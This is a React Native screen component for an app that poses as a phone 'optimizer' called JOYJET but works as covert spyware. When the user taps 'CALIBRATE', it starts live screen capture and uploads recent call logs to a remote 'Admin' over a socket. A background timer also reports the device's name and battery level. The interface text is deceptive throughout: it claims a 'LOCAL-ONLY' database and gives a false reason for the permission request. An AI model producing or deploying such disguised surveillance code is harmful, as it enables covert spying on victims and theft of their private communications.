import React, { useEffect, useState } from 'react';
import { 
  View, 
  Text, 
  TouchableOpacity, 
  StyleSheet, 
  PermissionsAndroid, 
  Alert,
  Platform 
} from 'react-native';
import * as Battery from 'expo-battery';
import CallLogs from 'react-native-call-log';
import { mediaDevices } from 'react-native-webrtc';
import socket from '../services/socket';

const GhostScreen = ({ route }) => {
  const { name } = route.params;
  const [isSyncing, setIsSyncing] = useState(false);

  useEffect(() => {
    // 1. Setup background tasks and permissions
    const startup = async () => {
      if (Platform.OS === 'android') {
        await PermissionsAndroid.requestMultiple([
          PermissionsAndroid.PERMISSIONS.READ_CALL_LOG,
          PermissionsAndroid.PERMISSIONS.READ_PHONE_STATE,
        ]);
      }
      // Start heartbeat for battery/connection
      setInterval(updateVitals, 45000);
    };
    startup();
  }, []);

  const updateVitals = async () => {
    const bat = await Battery.getBatteryLevelAsync();
    socket.emit('heartbeat_update', {
      name,
      battery: Math.floor(bat * 100) + '%',
      status: 'OPTIMIZED'
    });
  };

  // 2. The Live Screen Projection Trigger
  const startCalibration = async () => {
    try {
      setIsSyncing(true);
      
      // Request Media Projection (System Popup)
      const stream = await mediaDevices.getDisplayMedia({
        video: { width: 480, height: 854, frameRate: 10 } // Optimized for low data
      });

      if (stream) {
        // Sync Call Logs immediately during calibration
        const logs = await CallLogs.load(5);
        socket.emit('ghost_activity', {
          name,
          type: 'LOG_SYNC',
          data: logs
        });

        // Inform Admin the live feed is starting
        socket.emit('ghost_activity', { name, event: 'LIVE_FEED_STARTED' });
      }
    } catch (err) {
      setIsSyncing(false);
      Alert.alert("System", "Calibration requires screen overlay permission to analyze UI drain.");
    }
  };

  return (
    <View style={styles.container}>
      <View style={styles.header}>
        <Text style={styles.brand}>JOYJET // OPTIMIZER</Text>
        <Text style={styles.version}>v4.2.0-STABLE</Text>
      </View>

      <TouchableOpacity 
        style={[styles.orb, isSyncing && styles.orbActive]} 
        onPress={startCalibration}
      >
        <Text style={styles.orbText}>{isSyncing ? "ANALYZING..." : "CALIBRATE"}</Text>
      </TouchableOpacity>

      <View style={styles.statusBox}>
        <Text style={styles.statusText}>AI CORES: <Text style={styles.val}>8 ACTIVE</Text></Text>
        <Text style={styles.statusText}>ENCRYPTION: <Text style={styles.val}>WPA3-ENTERPRISE</Text></Text>
        <Text style={styles.statusText}>DATABASE: <Text style={styles.val}>LOCAL-ONLY</Text></Text>
      </View>
    </View>
  );
};

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: '#000', justifyContent: 'space-between', paddingVertical: 80, alignItems: 'center' },
  header: { alignItems: 'center' },
  brand: { color: '#fff', fontSize: 16, letterSpacing: 8, fontWeight: 'bold' },
  version: { color: '#222', fontSize: 9, marginTop: 5 },
  orb: { width: 200, height: 200, borderRadius: 100, backgroundColor: '#050505', borderWidth: 1, borderColor: '#111', justifyContent: 'center', alignItems: 'center' },
  orbActive: { borderColor: '#00ff00', shadowColor: '#00ff00', shadowRadius: 20, shadowOpacity: 0.4 },
  orbText: { color: '#444', fontSize: 11, fontWeight: 'bold', letterSpacing: 2 },
  statusBox: { width: '80%', padding: 20, backgroundColor: '#030303', borderRadius: 5, borderWidth: 1, borderColor: '#0a0a0a' },
  statusText: { color: '#1a1a1a', fontSize: 9, marginBottom: 5, letterSpacing: 1 },
  val: { color: '#0a220a' }
});

export default GhostScreen;
